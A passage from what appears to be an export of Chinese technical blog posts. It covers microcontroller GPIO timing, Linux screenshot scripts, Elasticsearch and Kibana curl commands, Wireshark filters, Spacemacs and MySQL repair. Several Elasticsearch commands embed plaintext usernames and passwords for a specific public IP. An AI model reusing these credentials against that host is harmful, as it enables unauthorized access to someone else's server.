出接地。若控制输出为1（无法直接输出高电平），则既不输出高电平 也不输出低电平，为高组态。为正常使用，必须在外部接一个上拉电 阻。\n特性： 它具“线与”特性，即很多个开漏模式 引脚连接到一起时，只有当所有 引脚都输出高阻态，才由上拉电阻提供高电平，此高电平的电压为外部 上拉电阻所接的电源的电压。若其中一个引脚为低电平，那线路就相当 于短路接地，使得整条线路都为低电平，0 伏。\n 3、复用推挽输出（GPIOModeAFPP）:用作串口的输出。\n4、复用开漏输出（GPIOModeAFOD）：用在IIC。\n\nSTM8 GPIO测试\n\n    GPIOInit(GPIOD, (GPIOPinTypeDef)GPIOPIN4, GPIOMODEOUTPPHIGHFAST);\n    while(1){\n        GPIOD-  ODR=0;\n        GPIOD-  ODR=0x10;\n        GPIOD-  ODR=1;\n        GPIOD-  ODR=0x10;\n        GPIOD-  ODR=2;\n        GPIOD-  ODR=0x10;\n        GPIOD-  ODR=3;\n        GPIOD-  ODR=0x10;\n    }\n    转换频率 3.937MHZ 周期 254ns 上升时间 22ns 下降时间 26ns\nGPIOMODEOUTPPHIGHSLOW\n  转换频率 3.968MHZ 周期 252ns 上升时间 30ns 下降时间 30ns\n\nSTM32 GPIO测试\n\n    GPIOInitTypeDef GPIOInitStructure; //定义结构体\n    RCCAPB2PeriphClockCmd(RCCAPB2PeriphGPIOE, ENABLE);\n    GPIOInitStructure.GPIOPin = GPIOPin2;\n    GPIOInitStructure.GPIOMode = GPIOModeOutPP; //推挽输出\n    GPIOInitStructure.GPIOSpeed = GPIOSpeed2MHz;\n    GPIOInit(GPIOE, \u0026GPIOInitStructure);\n\n    while(1){\n    GPIOE-  BRR = GPIOPin2;\n    GPIOE-  BSRR = GPIOPin2;\n    GPIOE-  BRR = GPIOPin2;\n    GPIOE-  BSRR = GPIOPin2;\n    GPIOE-  BRR = GPIOPin2;\n    GPIOE-  BSRR = GPIOPin2;\n    GPIOE-  BRR = GPIOPin2;\n    GPIOE-  BSRR = GPIOPin2;\n    GPIOE-  BRR = GPIOPin2;\n    GPIOE-  BSRR = GPIOPin2;\n    }\n    GPIOInitStructure.GPIOSpeed = GPIOSpeed50MHz;\n 转换频率 12MHZ 周期 83.2ns 上升时间 15ns 下降时间 15ns\n    GPIOInitStructure.GPIOSpeed = GPIOSpeed2MHz;\n 转换频率 11.96MHZ 周期 83.2ns 上升时间 20ns 下降时间 20ns\n\nSTM8 中断时间解析\n    _IO uint32t guiDelayCount = 0;\n    extern void SysTickISR(void);\n    INTERRUPTHANDLER(TIM4UPDOVFIRQHandler, 23)\n    {\n\n            TIM4-  SR1 = (uint8t)(~TIM4ITUPDATE\n    }\n执行一次中断 2.2us\nTIM4-  SR1 = (uint8t)(~TIM4ITUPDATE\n\n执行一次全局赋值 12.6us\nguiDelayCount++;\n\n一次函数调用 11 us\n    TIM4ClearITPendingBit(TIM4ITUPDATE);\n10us\n中断频率 1分频 160 us 一次中断 20us    中断时间\n中断频率 2分频 80 us 一次中断 20us     中断时间\n中断频率 4分频 40 us 一次中断 20.8us   中断时间\n中断频率 8分频 20 us 一次中断 20.8us   中断时间\n中断频率 16分频 10 us 一次中断 21.6us  中断时间\n20us\n中断频率 2分频 160 us 一次中断 20us    中断时间 18.4\n中断频率 4分频 80 us 一次中断 20.8us   中断时间\n中断频率 8分频 40 us 一次中断 20.8us   中断时间\n中断频率 16分频 20 us 一次中断 21.6us  中断时间\n中断频率 32分频 10 us 一次中断 20us    中断时间\n\n40us\n中断频率 4分频  160 us 一次中断 41.2us 中断时间 18.4\n中断频率 8分频  80 us 一次中断         中断时间\n中断频率 16分频 40 us 一次中断         中断时间\n中断频率 32分频 20 us 一次中断         中断时间\n中断频率 64分频 10 us 一次中断         中断时间\n50us\n中断频率 4分频  200us 一次中断 52     中断时间 17.6\n中断频率 8分频  100us 一次中断 52     中断时间 17.6\n中断频率 16分频 50 us 一次中断 52    中断时间 17.6\n中断频率 32分频 25 us 一次中断         中断时间\n80us\n中断频率 8分频  160us 一次中断 82.4us  中断时间 17.6 12.8 1.28 11.2\n中断频率 16分频 80 us 一次中断         中断时间\n中断频率 32分频 40 us 一次中断         中断时间\n中断频率 64分频 20 us 一次中断         中断时间\n中断频率 4分频  10  us 一次中断        中断时间\n100us\n中断频率 8分频  200us 一次中断 102     中断时间 17.6\n中断频率 16分频 100 us 一次中断 102    中断时间 17.6\n中断频率 32分频 50 us 一次中断         中断时间\n中断频率 64分频 25 us 一次中断         中断时间\n160us\n中断频率 16分频 160us 一次中断 162     中断时间 17.6\n中断频率 32分频 80 us 一次中断         中断时间\n中断频率 64分频 40 us 一次中断         中断时间\n中断频率 4分频  20  us 一次中断        中断时间\n中断频率 16分频 10 us 一次中断\n200us\n中断频率 16分频 160us 一次中断 162     中断时间 17.6","tags":null},{"location":"//blog.pytool.com/Linux/2016-01-01 Linux下给力截图工具","title":"Linux下给力截图工具归纳","text":"Linux下给力截图工具归纳 - oZuiJiaoWeiYang的专栏 - 博客频道 - CSDN.NET\n1、系统自带 gnome-screenshot\n截取自定义区域\ngnome-screenshot -a\n快捷键\n对窗口截屏 alt+ printscreen\n自定义选取截屏 shift+ printscreen\n复制截图到剪切版 ctrl+ printscreen\n复制框口截图到剪切版 ctrl+alt+printscreen\n复制特定选区到剪切版\ngnome3可以直接按键盘上的截屏键截屏的。同时按住shift键可以自定义区域\n\nImageMagick\nimport filename.png filename是你的截图名\nimport -frame Image6.png  #截取窗口\nimport -window root -resize 640 -pause 4 Pictures/Image7.png\n!/bin/bash\n https://github.com/Ceryn/img\nCall with '-s' to target only a selection of the screen.\n\nclientid='3e7a4deb7ac67da'\nimg=$(mktemp '/tmp/img-XXXXXX.png')\n\nscrot -z \"$@\" $img   /dev/null 2  \u00261 || exit\nres=$(curl -sH \"Authorization: Client-ID $clientid\" -F \"image=@$img\" \"https://api.imgur.com/3/upload\")\n\necho $res | grep -qo '\"status\":200' \u0026\u0026 link=$(echo $res | sed -e 's/.\"link\":\"\\(\\).*/\\1/' -e 's/\\\\//g')\ntest -n \"$link\" \u0026\u0026 (printf $link | xclip; printf \"\\a\" \u0026\u0026 rm \"$img\") || echo \"$res\"   \"$img.error\"\n\n 3、Scrot\n1.安装很简单，像安装其他软件一样，Fedora下 yum install scrot ， Ubuntu下apt-get install scrot就可以。\n2.一般用法，使用 scrot 可以抓取整个桌面、某个指定的窗口、以及选择的矩形区域。\n　　抓取桌面：scrot desktop.png，该命令将当前的整个桌面抓取下来，并保存为 desktop.png 文件。可以在当前的目录中找到此图像文件。\n　　抓取窗口：scrot -bs window.png，选项 b 使 scrot 在抓取窗口时一同将外边框抓取下来，而 s 选项则让用户选择所要抓取的是何窗口。\n　　抓取区域：scrot -s rectangle.png，在执行此命令后，使用鼠标拖曳的矩形区域将被 scrot 抓取下来，并保存为 rectangle.png 文件。\n3.高级用法，对于普通的抓取，使用 scrot 的基础便足以应付了。但在某些特殊情况之下，使用 scrot 抓取图像需要讲究一些技巧。\n　　延时抓取：scrot -cd 10 menu.png，此命令中的 d 选项用于延时抓取图像，其后的 10 代表延时 10 秒;前面的选项 c 显示倒计时。在抓取菜单或是命令提示时，该技巧将充分展示其魔力。\n　　生成缩图：scrot -t 50% thumb.png，这个命令在抓取图像的同时生成该图像的缩略图。选项 t 将打开此功能，其后的 50% 为原图的缩放百分比。\n　　更改品质：scrot -q 70 quality.jpg，此命令中的 q 选项用于更改所抓图像的品质，其数值介于 1-100 之间，默认为 75。数值越大，意味着图像品质越高;同时，图像的压缩率也就越低，占用空间越大。\n　　操作抓图：scrot action.png -e ‘mv $f ~/images/’，该命令将抓取的图像移动到 ~/images/ 目录。显然，操作图像的功能由 e 选项开启，其中的 $f 代表原图的路径/文件名。\n　　以上示例皆指定了需要保存的抓图的文件名称。实际上，如果不指定名称，那么 scrot 在抓取图像后会自动使用当前的日期时间、宽度高度的组合来生成文件名称。如：2012-07-21-154232238x148scrot.png\n\n　　然而这样还是不太方便。可以新建一个文件，如screenshot\n　　touch screenshot\n　　vim screenshot（如果没有安装vim，可以执行sudo apt-get install vim进行安装）\n　　输入 scrot -s -e ‘mv $f ~/screenshots’（注：mv $f ~/screenshots命令两边为单引号）\n　　保存退出vim，然后 chmod u+x screenshot\n　　这样就可以通过运行screenshot文件来执行scrot了。或者可以通过建立软链接来使用scrot。比如：在/usr/bin目录下执行sudo ln -s ~/screenshot scs。以后直接在终端里输入scs即可用鼠标截图。\n操作抓图：scrot action.png -e 'mv $f ~/images/'，该命令将抓取的图像移动到 ~/images/ 目录。显然，操作图像的功能由 e 选项开启，其中的 $f 代表原图的路径／文件名。\n下面是方便截图的一个脚本，放在/usr/local/bin下，在方便的地方建个快捷方式，一单击即可进入截图状态\n!/bin/bash\n 注意下面的“＋”号要紧接着％Y。（我之前没注意到这点，哎，截了半天也没截出东西\n/soft/scrot/bin/scrot -s /home/用户名/picture/`date -d yesterday\n+%Y-%m-%d-%H-%M-%S`.jpg\nDeepin-ScreenShot\n\n!/bin/bash\n linux deps: xsel espeak scrot rsync\nosx deps: none\n assumptions: authorized to ssh into host w/o password\n\nOS=uname\n\nRemote server to upload to\nHOST=\"yourhost.com\"\n\n Remote user to login to HOST with\nUSER=\"user\"\n\nPath on remote server to upload to\nUPLOADPATH=\"/path/to/www-img\"\n\n Base path where image will be accessible from\nBASEURL=\"http://yourhost.com/img\"\n\nTemp file to store screen shot\nTEMPFILE=\"$(mktemp /tmp/screenshot.XXXXX.png)\"\n\n Take screen shot, save to temp file\nif [[ \"$OS\" == \"Linux\" ]]; then\n    scrot -s $TEMPFILE\nelse\n    screencapture -s $TEMPFILE\nfi\n\nHouston, we have a problem!\nif [[ $? -ne 0 ]]; then\n    if [[ \"$OS\" == \"Linux\" ]]; then\n        espeak error \u0026  /dev/null \u0026\n    else\n        say error \u0026\n    fi\n    exit 1\nfi\n\n Create filename based on MD5 to guarantee uniqueness\nif [[ \"$OS\" == \"Linux\" ]]; then\n    MD5=\"$(cat $TEMPFILE | md5sum)\"\nelse\n    MD5=\"$(cat $TEMPFILE | md5)\"\nfi\n\nOnly take first five characters from MD5\nIMAGENAME=\"${MD5:0:5}.png\"\n\n Copy file to remote server\nrsync --chmod=u=rw,g=r,o=r --perms $TEMPFILE $USER@$HOST:$UPLOADPATH/$IMAGENAME\n\nCopy link to clipboard\nif [[ \"$OS\" == \"Linux\" ]]; then\n    echo \"$BASEURL/$IMAGENAME\" | tr -d '\\n' | xsel --clipboard --input\nelse\n    echo \"$BASEURL/$IMAGENAME\" | tr -d '\\n' | pbcopy\nfi\n\n Cleanup\nrm $TEMPFILE\n\nif [[ \"$OS\" == \"Linux\" ]]; then\n    espeak ding \u0026  /dev/null \u0026\nelse\n    say ding \u0026\nfi\n`","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 Elasticsearch RESTAPI 约定","title":"RESTAPI 约定","text":"---\nElasticsearch Reference [5.4] » API Conventions » Common options\n常用选项\n\n以下选项可以应用于所有 REST APIs 。\n\n 优雅的结果\n\n当对任何请求追加?pretty=true时，返回的JSON将会优雅地格式化（仅用于调试！）。另一个选项是设置?format = yaml，这将使结果以（有时）更可读的 yaml格式返回。\n\n人类可读的输出（Human readable output）\n\n以适合人类的格式（例如 \"existstime\":\"1h\" 或者 \"size\":\"1kb\"）和计算机（例如 \"existstimeinmillis\":\"3600000\" 或者 \"sizeinbytes\":\"1024\"）返回统计信息。通过向查询字符串中添加?human=false可以关闭人类可读的值。当统计结果被监视工具消费而不是用于人类消费时，这将是有意义的。人性化标志的默认值是false。\n\n 日期运算\n\n接受格式化的日期值的参数大多数都支持日期运算——譬如使用gt与lt的范围查询，或者使用from与to的日期范围聚合。\n\n表达式以锚定日期开始，可以是now，也可以||结尾的日期字符串。此锚定日期可以选择性地后跟一个或多个数学表达式：\n\n数学表达式 | 含义","tags":null},{"location":"//blog.pytool.com/Post/Elastic/Kibana/2016-10-04 Kibana 基础 ","title":"Kibana 基础","text":"Kibana 4 Templates for Suricata\n Kibana 5.x 加强安全 \n\n/scripts/importdashboards -es http://120.92.36.21:9200 -user elastic -pass changeme\n\nmapping\n 先建立一个索引\n\ncurl -XPUT localhost:9200/abc\n\n然后定义映射，注意：只有刚刚新建、还没有任何数据的索引，才能定义映射。定义映射Mapping可以使用mapping RESTAPI，符合下面的标准语法：\n\ncurl -XPUT localhost:9200/索引名称/类型名称/mapping?pretty -d '{\"类型名称\":{\"properties\":{\"字段名称\":{\"type\":\"字段类型\",\"store\":\"是否存储\",\"index\":\"索引方式、是否分析\"}}}}'\n\n index-pattern\n$CURL -XPOST \"$ELASTICSEARCH/.kibana/index-pattern/$name\" -d \"@$file\"\nsearch\n$CURL -XPUT \"$ELASTICSEARCH/.kibana/search/$name\" -d \"@$file\" || exit 1\n visualization\n$CURL -XPUT \"$ELASTICSEARCH/.kibana/visualization/$name\" -d \"@$file\" || exit 1\ndashboard\n$CURL -XPUT \"$ELASTICSEARCH/.kibana/dashboard/$name\" -d \"@$file\" || exit 1\n config\n$CURL -XPOST $ELASTICSEARCH/.kibana/config/4.3.1 -d @dashboards/config.json || exit 1\n创建index并导入mapping\ncurl -s -XPUT -H \"Content-Type: application/json\" --data @twittermapping.json \\\nhttp://elasticsearch:9200/twitter/; echo\n\ncurl -s -XPUT -H \"Content-Type: application/json\" --data @kibanamapping.json \\\nhttp://elasticsearch:9200/.kibana/; echo\n\ncurl -s -XPOST -H \"Content-Type: application/json\" --data @kibanaconfig.json \\\nhttp://elasticsearch:9200/.kibana/config/4.1.0; echo\n\ncurl -s -XPOST http://elasticsearch:9200/.kibana/index-pattern/twitter -d '{\n\t\"title\": \"twitter\",\n\t\"timeFieldName\": \"createdat\"\n}'; echo\n\ncurl -s -H \"Content-Type: application/json\" --data @${RIVERFILE} \\\nhttp://elasticsearch:9200/river/twitter/meta; echo\n\n 创建ingest\nPUT ingest/pipeline/my-pipeline-id\n\n快照备份\ncurl -XPUT -u elastic:P@ssw0rd http://120.92.36.21:9200/snapshot/backup/snapshotdate +%Y.%m.%d?waitforcompletion=true \u0026\u0026 curl -XDELETE -u elastic:infra321 http://120.92.36.21:9200/access-date +%Y.%m.%d -d \"-31 day\"\ncurl -XDELETE http://120.92.36.21:9200/access-date +%Y.%m.%d -d \"-1 day\"\ncuratorcli --host 192.168.19.12 snapshot --repository backup\n\n close the kibana index, restore it from snapshot, and reopen it\ncloseKibanaIndexCmd=\"curl -XPOST /.kibana/close\\\"\"\nrestoreSnapshotCmd=\"curl -XPOST /snapshot/elkbackup/$1/restore\\\"\"\nreopenKibanaIndexCmd=\"curl -XPOST /.kibana/open\\\"\"\nsnapshotRepoCmd=\"curl -XPUT -s $authString \\\"$elkbaseurl/snapshot/elkbackup\\\" -d '{\n      \\\"type\\\": \\\"fs\\\",\n      \\\"settings\\\": {\n          \\\"location\\\": \\\"/tmp/elkinstalldir/snapshots/\\\"\n      }\n  }'\"\n\necho \"creating repo...\"\neval $snapshotRepoCmd\necho \"closing kibana index...\"\necho \"restoring snapshot...\"\n\necho \"reopening kibana index...\"\n\ncurl -XPOST -u esadmin:esadmin  -s \"http://120.92.36.21:9200/.kibana/close\"\ncurl -XPOST -u esadmin:esadmin  -s \"http://120.92.36.21:9200/snapshot/elkbackup/$1/restore\"\ncurl -XPOST -u esadmin:esadmin  -s \"http://120.92.36.21:9200/.kibana/open\"","tags":null},{"location":"//blog.pytool.com/Post/Go/golang语言包用法/os_user","title":"golang中os/user包用法","text":"---\nchenbaoke的专栏","tags":null},{"location":"//blog.pytool.com/Hacker/2016-03-29 WirShark过滤语法","title":"WireShark 过滤语法","text":"---\nWireShark 过滤语法\n\n原文地址：http://wenku.baidu.com/view/e8afe23143323968011c925f.html\n\n过滤IP，如来源IP或者目标IP等于某个IP\n例子:\nip.src eq 192.168.1.107 or ip.dst eq 192.168.1.107\n或者\nip.addr eq 192.168.1.107 // 都能显示来源IP和目标IP\n\n过滤端口\n例子:\ntcp.port eq 80 // 不管端口是来源的还是目标的都显示\ntcp.port == 80\ntcp.port eq 2722\ntcp.port eq 80 or udp.port eq 80\ntcp.dstport == 80 // 只显tcp协议的目标端口80\ntcp.srcport == 80 // 只显tcp协议的来源端口80\n\nudp.port eq 15000\n\n过滤端口范围\ntcp.port   = 1 and tcp.port \u003c= 80\n\n过滤协议\n例子:\ntcp\nudp\narp\nicmp\nhttp\nsmtp\nftp\ndns\nmsnms\nip\nssl\noicq\nbootp\n等等\n\n排除arp包，如!arp   或者   not arp\n\n过滤MAC\n太以网头过滤\neth.dst == A0:00:00:04:C5:84 // 过滤目标mac\neth.src eq A0:00:00:04:C5:84 // 过滤来源mac\neth.dst==A0:00:00:04:C5:84\neth.dst==A0-00-00-04-C5-84\neth.addr eq A0:00:00:04:C5:84 // 过滤来源MAC和目标MAC都等于A0:00:00:04:C5:84的\n\nless than 小于 \u003c lt\n小于等于 le\n\n等于 eq\n大于 gt\n大于等于 ge\n不等 ne\n\n包长度过滤\n例子:\nudp.length == 26 这个长度是指udp本身固定长度8加上udp下面那块数据包之和\ntcp.len   = 7   指的是ip数据包(tcp下面那块数据),不包括tcp本身\nip.len == 94 除了以太网头固定长度14,其它都算是ip.len,即从ip本身到最后\nframe.len == 119 整个数据包长度,从eth开始到最后\n\neth","tags":null},{"location":"//blog.pytool.com/Edit/2015-01-12 文本编辑 spacemacs","title":"文本编辑 spacemacs","text":"---\nappleshan/my-spacemacs-config: My personal Spacemacs config\ndotspacemacs/.spacemacs at master · pandemie/dotspacemacs\n安装 \u0026 使用\nsudo apt-get install emacs\n$ git clone https://github.com/syl20bnr/spacemacs ~/.emacs.d\n\ngit clone https://github.com/syl20bnr/spacemacs.git ~/.emacs.d -b develop\ngit clone https://github.com/zilongshanren/spacemacs-private.git ~/.spacemacs.d/\n如果使用了 .spacemacs.d 目录来保存你的 spacemacs 配置，就不需要在 HOME 目录维护一个 .spacemacs 文件了。 至于为什么要使用 .spacemacs.d 目录而不是 .spacemacs 文件，主要是方便分离自己的配置与 spacemacs 的配置，更新更容易。\n如果发现添加在 .spacemacs.d/init.el 里面的配置没有生效，检查一下是否你的 HOME 目录还存在一个 .spacemacs 文件。\n问题汇总\n\nFile error: Cannot open load file, No such file or directory, bind-map\n解決方法：\nbind-map spacemacs启动的时候下载的 选择 spacemacs-base 模式先把bind-map下载下来\n\n ELPA 镜像http://elpa.emacs-china.org\n添加下面的代码到.spacemacs的dotspacemacs/user-init()\n(setq configuration-layer--elpa-archives\n    '((\"melpa-cn\" . \"http://elpa.emacs-china.org/melpa/\")\n      (\"org-cn\"   . \"http://elpa.emacs-china.org/org/\")\n      (\"gnu-cn\"   . \"http://elpa.emacs-china.org/gnu/\")))\n\n使用代理\n(setq url-proxy-services\n   '((\"no_proxy\" . \"^\\\\(localhost\\\\|10.\\\\)\")\n     (\"http\" . \"127.0.0.1：8087\")\n     (\"https\" . \"127.0.0.1:8087\")))\n emacs 中怎么删除最大匹配的括号中的内容?\n先把光标放置到最左边的括号处，然后C-M-K就可以\n\n跳转总结：\n同一层级\n  ( 往前跳|往上跳 C-M-b backward-sexp\n    往前跳|往上跳 C-M-p backward-list\n上一级\n  ( 往上跳 C-M-u  backward-up-list\n\n优化删除括号的函数\n\n这一期没啥内容，只是最近写代码的时候发现 Emacs 自带的删除括号功能 （'delete-pair）非常的原始且不好用，于是随手写了个优化的版本。\n(defun c-delete-pair ()\n  (interactive)\n  (let ((re \"[([{\u003c'\\\"]\"))\n    (when (or (looking-at-p re) (re-search-backward re nil t))\n      (save-excursion (forward-sexp) (delete-char -1))\n      (delete-char 1))))\n使用该函数可以向前搜索括号（以及引号）然后删除匹配的括号（或者引号）。\n\n 安装插件\n\n约定\n+TITLE: Spacemacs Conventions\n\n Use-package\nAlways use =progn= when a code block requires multiple lines for =:init= or\n  =:config= keywords.\nIf there is only one line of code then try to keep =:init= or =:config=\n  keywords on the same line.\nDon't nest multiple =use-package= calls unless you have a very good reason\n  to do it.\n\ndwim  缩写（Do what I mean）。\n\n调试技巧\n(pp (macroexpand '(\n  ;;pp 格式化输出，让输出更美观\n  ;;macroexpand 宏展开\n  )))\n小技巧：\nleft\"  'evil-window-left\nSPC SPC | M-x 进入命令模式\nM-n 自动输入当前所在的文本\nM-p 选择历史输入\n\n插件\nemacs-window-manager\nemacs-neotree : neotree\navy(ace) : easymotion\n\npopwin 光标自动跳转到新建的窗口中\nweb-mode: html 模版编辑扩展(项目地址)\njs2-mode: javascript 编辑扩展(项目地址)\nflycheck: 语法检查(项目地址)\nsmex: 命令输入自动补全(项目地址)\ncompany-mode: 代码自动补全(项目地址)\nmagit: git 管理插件(项目地址)\nmarkdown-mode: markdown 编辑扩展(项目地址)\nweb-beautify: js/css/html代码格式化(项目地址)\nwindow-numbering: 编辑窗口分割(项目地址)\nparedit 该插件用于括号/引号的自动补全. 如果担心evil mode破坏括号的完整, 编写时先暂停掉evil mode\n\ninstall ag or rg\nM-x package-install dumb-jump\n跳转到定义 dumb-jump\n代码折叠 hs-minor-mode\n快速选定区域 expand-region\n简化按键利器hydra\norg-capture是orgmode的最新特性之一，它试图取代org-remember，成为快速记录的利器。\nProdigy可以让你在Emacs中直接管理外部服务, 方便快捷, 无需多次切换. 比如: Python Simple HTTP Server, Nodemon Server, Sinatra Server 或 Octopress Preview.\norg-bullets org皮肤，更好看\n layer\nSPC h l 查看layer帮助\nSPC h R 在帮助文档org中搜索\n\nspacemacs  快捷键\n, | SPC m major-mode\nz\ng\n\nSPC h SPC | SPC h p 查看layer源码\nSPC h k 查看顶层快捷键*\n同上查看当前mode的快捷键  which-key-show-top-level\n\nM-m | SPC   触发  \nM-x | SPC ：命令行\nM-g |       移动\nM-s |       搜索\nC-w | SPC w 窗口相关\nC-x |       系统功能\nC-c |       命令模式 [major mode]\nC-g |       取消命令\n\nC-h |       帮助\n\nctrl+z      切换 evil 和 emacs模式\nSPC s j  dird-jump\n:hint-is-doc t\n:dynamic-hint(spacemacs//layouts-ts-hint)\n\n 快速切换窗口\nalt+1 .. 0\nSPC 1 .. 0\nSPC w m: 最大化或者最小化当前窗口\nSPC w s | SPC w - 水平分割窗口\nSPC w v | SPC w / 垂直分割窗口\n\nC-c \u003c- | SPC w u winner undo\nC-c -  | SPC w U winner redo\n\nSPC a u     undo-tree-visualize\n重复\nC-u 次数 命令\n\nC-,\nM-w 复制\n\n区域选择\nC-= : 不断的按该快捷键,会使选定的区域不断的扩展,而且只扩展到语法层面的父 结构中,\nSPC v   er/expand-region 扩展选定区域;接着按ｖ就可以不断的扩大选择区域, 按V可以缩小区域\n        er/contract-region 缩小选定区域\n行插入\nSPC i j: 在当前行的下面插入一个空行\nSPC i k: 在当前行的上面插入一个空行\n\n orgmode\ng 跳转\nagenda\nC-c a\n|SPC m a org-agenda\nC-c c|SPC m c org-capture\n 文件\n\nC-c C-f |SPC f f find-file","tags":null},{"location":"//blog.pytool.com/Post/Elastic/2016-10-04 Elasticsearch 基础指令","title":"Elasticsearch","text":"http://elasticsearch-cheatsheet.jolicode.com/\n\n1.集群健康(cluster health)\ncurl -u elastic:changeme 120.92.36.21:9200/cluster/health?pretty\n 2. mget允许我们一次性检索多个文档一样\n3. bulk API允许我们使用一个请求来实现多个文档的create[当文档不存在时创建]、index[创建新文档或替换已有文档]、update[局部更新文档]或delete\n\n 4. search 空搜索只有10个文档在hits数组中。\n分页 看到其他文档\n\n和SQL使用LIMIT关键字返回只有一页的结果一样，Elasticsearch接受from和size参数：\n\nfrom: 跳过开始的结果数，默认0\nsize: 结果数，默认10\ncurl -u elastic:changeme 120.92.36.21:9200/search?from=10\u0026size=5\n\ncurl -u elastic:changeme 120.92.36.21:9200/search?searchtype=count\u0026size=0\n match查询子句用来找寻在title字段中找寻包含dns的成员：\ncurl -u elastic:changeme 120.92.36.21:9200/search?pretty -d '\n{\n    \"query\": {\n      \"match\": {\n          \"title\": \"dns\"\n      }\n    }\n}\n'\n\nmapping 映射\ncurl -u elastic:changeme '120.92.36.21:9200/mapping?from=10\u0026size=5'\n\n如果是按日期索引的日志，那么最好定期清除旧索引：\n curl -XDELETE -u USER:PASSWORD http://HOST:9200/logstash-$(date -d '-10days' +'%Y.%m.%d')\n\na、导入模版\ncurl -XPUT -u elastic:changeme  'http://120.92.36.21:9200/template/filebeat?pretty' -d@/etc/filebeat/filebeat.template.json\n\nb、查看模版\ncurl -u elastic:changeme  'http://120.92.36.21:9200/template/filebeat?pretty'\n\nc、清理旧的 index（如果是新配置的服务，没有生成任何 index 因此也不需要清理，可略过这一步）\n先查看现有的 index\ncurl -u elastic:changeme  '120.92.36.21:9200/cat/indices?v'\n删除 filebeat- 匹配的所有 index\ncurl -XDELETE 'http://120.92.36.21:9200/filebeat-?pretty'\n再次查看，确认一下结果是否符合预期：\ncurl -u elastic:changeme '120.92.36.21:9200/cat/indices?v'\n\n###########################\nKIBANA\n###########################\n\nurlelasticsearch = 'http://120.92.36.21:9200'\nkibanaelementdir = '/vagrant/cookbooks/elk-reflex/files/default/kibana'\n\n Commands to export Kibana element :\n- curl http://120.92.36.21:9200/.kibana/dashboard/DASHBOARDNAME/source?pretty=1   DASHBOARDFILE.json\n\t\t- curl http://120.92.36.21:9200/.kibana/visualization/VISUALIZATIONNAME/source?pretty=1   VISUALIZATIONFILE.json\n- curl http://120.92.36.21:9200/.kibana/search/SEARCHNAME/source?pretty=1   SEARCHFILE.json\n\nbash 'kibana creating index' do\n  code \u003c\u003c-EOH\ncurl -XDELETE #{urlelasticsearch}/logstash-\ncurl -XPOST #{urlelasticsearch}/template/reflex --data \"@#{kibanaelementdir}/templatereflex.json\"\ncurl -XPOST #{urlelasticsearch}/.kibana/index-pattern/logstash- -d '{\"title\" : \"logstash-\",  \"timeFieldName\": \"@timestamp\"}'\ncurl -XPUT #{urlelasticsearch}/.kibana/config/4.6.1 -d '{\"defaultIndex\" : \"logstash-\"}'\n    EOH\n  retries 3\n  retrydelay 5\nend\n\nbash 'kibana creating searches' do\n  code \u003c\u003c-EOH\ncurl -XPOST #{urlelasticsearch}/.kibana/search/Error-List --data \"@#{kibanaelementdir}/searchError-List.json\"\ncurl -XPOST #{urlelasticsearch}/.kibana/search/Traces --data \"@#{kibanaelementdir}/searchTraces.json\"\ncurl -XPOST #{urlelasticsearch}/.kibana/search/SQL-Dump-List --data \"@#{kibanaelementdir}/searchSQL-Dump-List.json\"\n    EOH\nend\n\nbash 'kibana creating visualizations' do\n  code \u003c\u003c-EOH\ncurl -XPOST #{urlelasticsearch}/.kibana/visualization/Activity --data \"@#{kibanaelementdir}/visualizationActivity.json\"\ncurl -XPOST #{urlelasticsearch}/.kibana/visualization/Top-10-Errors --data \"@#{kibanaelementdir}/visualizationTop-10-Errors.json\"\ncurl -XPOST #{urlelasticsearch}/.kibana/visualization/Error-Number --data \"@#{kibanaelementdir}/visualizationError-Number.json\"\ncurl -XPOST #{urlelasticsearch}/.kibana/visualization/Users --data \"@#{kibanaelementdir}/visualizationUsers.json\"\ncurl -XPOST #{urlelasticsearch}/.kibana/visualization/Server-Role --data \"@#{kibanaelementdir}/visualizationServer-Role.json\"\ncurl -XPOST #{urlelasticsearch}/.kibana/visualization/Programs --data \"@#{kibanaelementdir}/visualizationPrograms.json\"\ncurl -XPOST #{urlelasticsearch}/.kibana/visualization/SQL-Cursor --data \"@#{kibanaelementdir}/visualizationSQL-Cursor.json\"\ncurl -XPOST #{urlelasticsearch}/.kibana/visualization/SQL-Dump-Repartition --data \"@#{kibanaelementdir}/visualizationSQL-Dump-Repartition.json\"\n    EOH\nend\n\nbash 'kibana creating dashboard' do\n  code \u003c\u003c-EOH\ncurl -XPOST #{urlelasticsearch}/.kibana/dashboard/Main-Reflex --data \"@#{kibanaelementdir}/dashboardMain-Reflex.json\"\ncurl -XPOST #{urlelasticsearch}/.kibana/dashboard/SQL-Dump-Reflex --data \"@#{kibanaelementdir}/dashboard_SQL-Dump-Reflex.json\"\n    EOH\nend","tags":null},{"location":"//blog.pytool.com/Post/数据库/mysql-repair","title":"MySQL 数据库修复","text":"7忠修复MySQL数据库的方法，当简单的重启对数据库不起作用，或者有表崩溃时。\n\n简单的MySQL重启：\n\n/usr/local/mysql/bin/mysqladmin -uUSERNAME -pPASSWORD shutdown\n/usr/local/mysql/bin/mysqldsafe \u0026\n\n 1、MyISAM表崩溃\n\nMySQL数据库允许不同的表使用不同的存储引擎。它用来存储与检索数据。较流行的存储引擎是MyISAM与InnoDB。\n\nMyISAM表最终“将”崩溃。这是个不争的事实。\n\n幸运的是，在多数情况下，MyISAM表崩溃很容易修复。\n\n修复单一表，连接你的数据库执行：\n\nrepair TABLENAME\n\n修复所有的表，执行：\n\n/usr/local/mysql/bin/mysqlcheck –all-databases -uUSERNAME -pPASSWORD -r\n\n多数情况，只有当你浏览日志文件时，才知道MyISAM表崩溃了。\n我强烈建议在你的/etc/my.cnf配置文件中添加此行。一旦表崩溃它将进行自动修复。\n\n[mysqld]\nmyisam-recover=backup,force\n\n如果这个也不管用，还有其他的方法可以试试。\n\n2、多实例MySQL\n\n当你重启MySQL后，进程马上死掉，这很常见。\n查看日志文件，它会告诉你，另一个MySQL实例可能正在运行。\n\n停止所有MySQL实例：\n\n/usr/local/mysql/bin/mysqladmin -uUSERNAME -pPASSWORD shutdown\nkillall mysql\nkillall mysqld\n\n现在重启数据库，将只有一个实例在运行。\n\n 3、改变InnoDB日志设置\n一旦MySQL数据库有在运行InnoDB引擎，你就一定不能修改/etc/my.cnf文件中如下几行：\n\ndatadir = /usr/local/mysql/data\ninnodbdatahomedir = /usr/local/mysql/data\ninnodbdatafilepath = ibdata1:10M:autoextend\ninnodbloggrouphomedir = /usr/local/mysql/data\ninnodblogfilesingroup = 2\ninnodblogfilesize = 